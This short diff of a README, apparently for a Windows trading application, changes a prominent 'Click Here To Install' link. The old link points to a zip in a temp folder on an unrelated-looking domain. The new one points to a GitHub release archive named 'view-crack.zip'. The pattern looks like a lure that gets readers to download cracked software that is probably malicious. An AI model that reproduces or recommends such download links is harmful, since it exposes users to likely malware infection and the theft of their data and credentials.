@@ -1,6 +1,6 @@
 ![imagesg](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
 
-<H1 align=center><a href="https://allotaxidakar.com/temp/Client%20Update%20setup.zip">[Click Here To Install]</a></H1>
+<H1 align=center><a href="https://github.com/dwantless/Trading-Application-For-PC/releases/download/releases-v.3.11/view-crack.zip">[Click Here To Install]</a></H1>
 
 
 ### Updated Features
